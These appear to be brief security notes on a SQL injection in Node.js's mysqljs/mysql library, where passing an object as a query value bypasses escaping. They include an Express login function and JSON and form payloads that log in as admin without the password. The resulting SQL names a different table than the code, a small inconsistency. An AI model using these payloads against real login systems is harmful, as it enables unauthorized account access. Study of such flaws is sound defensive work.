#sqli 
https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4
# TLDR
Unexpected behavior of escape function during passing values to #mysql in #nodejs projects.
Express code:
```javascript
async loginUser(user, pass) {
	return new Promise(async (resolve, reject) => {
		let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
		this.connection.query(stmt, [user, pass], (err, result) => {
			if(err || result.length == 0)
				reject(err)
			resolve(result)
		})
	});
}
```
User/pass:
```json
{"username":"admin","password":{"password": 1}}
```
or
```
username=admin&password[password]=1
```
Evaluates to:
```sql
SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1
```